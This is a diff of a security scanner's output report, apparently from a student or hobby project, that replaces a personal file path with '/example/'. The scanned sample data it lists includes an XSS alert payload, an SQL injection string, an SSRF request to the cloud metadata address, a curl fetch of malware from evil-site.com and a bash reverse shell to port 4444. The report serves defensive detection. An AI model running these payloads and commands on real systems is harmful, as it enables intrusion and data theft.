@@ -1,9 +1,9 @@
-Scan report for: /Users/davidionclarksr./python-projects/secure-scan/data/.DS_Store
+Scan report for: /example/secure-scan/data/.DS_Store
 Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
 ------------------------------------------------------------
 ✅ No matches found.
 
-Scan report for: /Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json
+Scan report for: /example/secure-scan/data/vulnerability_history.json
 Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
 ------------------------------------------------------------
 Total Matches: 703
@@ -11,7 +11,7 @@ HIGH: 129
 MEDIUM: 97
 LOW: 0
 
-Line 259 | HIGH | password | "file": "/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt",
+Line 259 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
 Line 281 | HIGH | password | "content": "Suspicious filename: urgent_payroll_password.txt"
 Line 289 | HIGH | password | "content": "Suspicious filename: urgent_payroll_password.txt"
 Line 297 | HIGH | password | "content": "Suspicious filename: urgent_payroll_password.txt"
@@ -26,13 +26,13 @@ Line 361 | HIGH | password | "content": "Suspicious filename: urgent_payroll_pas
 Line 369 | HIGH | password | "content": "Suspicious filename: urgent_payroll_password.txt"
 Line 377 | HIGH | password | "content": "Suspicious filename: urgent_payroll_password.txt"
 Line 383 | HIGH | password | "finding": "weak_password",
-Line 384 | HIGH | password | "file": "/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt",
+Line 384 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
 Line 390 | HIGH | password | "remediation": "Enforce strong password policies.",
-Line 509 | HIGH | password | "file": "/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt",
-Line 634 | HIGH | password | "file": "/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt",
-Line 759 | HIGH | password | "file": "/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt",
+Line 509 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
+Line 634 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
+Line 759 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
 Line 883 | HIGH | token | "finding": "token",
-Line 884 | HIGH | password | "file": "/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt",
+Line 884 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
 Line 906 | HIGH | token | "content": "JWT token leaked: eyJhbGciOi"
 Line 914 | HIGH | token | "content": "JWT token leaked: eyJhbGciOi"
 Line 922 | HIGH | token | "content": "JWT token leaked: eyJhbGciOi"
@@ -46,8 +46,8 @@ Line 978 | HIGH | token | "content": "JWT token leaked: eyJhbGciOi"
 Line 986 | HIGH | token | "content": "JWT token leaked: eyJhbGciOi"
 Line 994 | HIGH | token | "content": "JWT token leaked: eyJhbGciOi"
 Line 1002 | HIGH | token | "content": "JWT token leaked: eyJhbGciOi"
-Line 1009 | HIGH | password | "file": "/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt",
-Line 1134 | HIGH | password | "file": "/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt",
+Line 1009 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
+Line 1134 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
 Line 1156 | HIGH | xss | "content": "XSS payload detected: <script>alert(1)</script>"
 Line 1164 | HIGH | xss | "content": "XSS payload detected: <script>alert(1)</script>"
 Line 1172 | HIGH | xss | "content": "XSS payload detected: <script>alert(1)</script>"
@@ -61,7 +61,7 @@ Line 1228 | HIGH | xss | "content": "XSS payload detected: <script>alert(1)</scr
 Line 1236 | HIGH | xss | "content": "XSS payload detected: <script>alert(1)</script>"
 Line 1244 | HIGH | xss | "content": "XSS payload detected: <script>alert(1)</script>"
 Line 1252 | HIGH | xss | "content": "XSS payload detected: <script>alert(1)</script>"
-Line 1259 | HIGH | password | "file": "/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt",
+Line 1259 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
 Line 1508 | HIGH | token | "finding": "github_token",
 Line 1515 | HIGH | token | "remediation": "Remove token and rotate credentials.",
 Line 1633 | HIGH | password | "finding": "password",
@@ -109,18 +109,18 @@ Line 3236 | HIGH | xss | "content": "ERROR XSS payload: <script>alert(1)</script
 Line 3244 | HIGH | xss | "content": "ERROR XSS payload: <script>alert(1)</script>"
 Line 3252 | HIGH | xss | "content": "ERROR XSS payload: <script>alert(1)</script>"
 Line 4008 | HIGH | password | "finding": "password",
-Line 4031 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4039 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4047 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4055 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4063 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4071 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4079 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4087 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4095 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4103 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4111 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
-Line 4119 | HIGH | password | "content": "\"file\": \"/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt\","
+Line 4031 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4039 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4047 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4055 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4063 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4071 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4079 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4087 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4095 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4103 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4111 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
+Line 4119 | HIGH | password | "content": "\"file\": \"/example/secure-scan/data/urgent_payroll_password.txt\","
 Line 4125 | HIGH | password | "finding": "weak_password",
 Line 4132 | HIGH | password | "remediation": "Enforce strong password policies.",
 Line 4593 | HIGH | token | "finding": "token",
@@ -715,7 +715,7 @@ Line 6677 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request mad
 Line 6685 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
 Line 6693 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
 
-Scan report for: /Users/davidionclarksr./python-projects/secure-scan/data/payload.EXE
+Scan report for: /example/secure-scan/data/payload.EXE
 Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
 ------------------------------------------------------------
 Total Matches: 1
@@ -725,7 +725,7 @@ LOW: 0
 
 Line 0 | HIGH | dangerous_file_type | Dangerous file detected: payload.EXE
 
-Scan report for: /Users/davidionclarksr./python-projects/secure-scan/data/invoice.pdf.EXE
+Scan report for: /example/secure-scan/data/invoice.pdf.EXE
 Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
 ------------------------------------------------------------
 Total Matches: 3
@@ -737,7 +737,7 @@ Line 0 | HIGH | dangerous_file_type | Dangerous file detected: invoice.pdf.EXE
 Line 0 | HIGH | double_extension | Suspicious double extension: invoice.pdf.EXE
 Line 0 | MEDIUM | suspicious_filename | Suspicious filename: invoice.pdf.EXE
 
-Scan report for: /Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt
+Scan report for: /example/secure-scan/data/urgent_payroll_password.txt
 Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
 ------------------------------------------------------------
 Total Matches: 10
@@ -756,7 +756,7 @@ Line 4 | UNKNOWN | sql_injection_payload | SQL injection attempt: ' OR '1'='1
 Line 7 | UNKNOWN | api_key_assignment | Sensitive data exposed: api_key=12345
 Line 9 | UNKNOWN | ip_address | SSRF request to http://169.254.169.254/latest/meta-data
 
-Scan report for: /Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt
+Scan report for: /example/secure-scan/data/sample_log.txt
 Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
 ------------------------------------------------------------
 Total Matches: 43
@@ -808,7 +808,7 @@ Line 48 | UNKNOWN | download_activity | ALERT curl http://evil-site.com/malware.
 Line 49 | UNKNOWN | ip_address | ALERT bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
 Line 51 | UNKNOWN | powershell | ALERT powershell execution detection
 
-Scan report for: /Users/davidionclarksr./python-projects/secure-scan/data/reports/.DS_Store
+Scan report for: /example/secure-scan/data/reports/.DS_Store
 Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
 ------------------------------------------------------------
 ✅ No matches found.
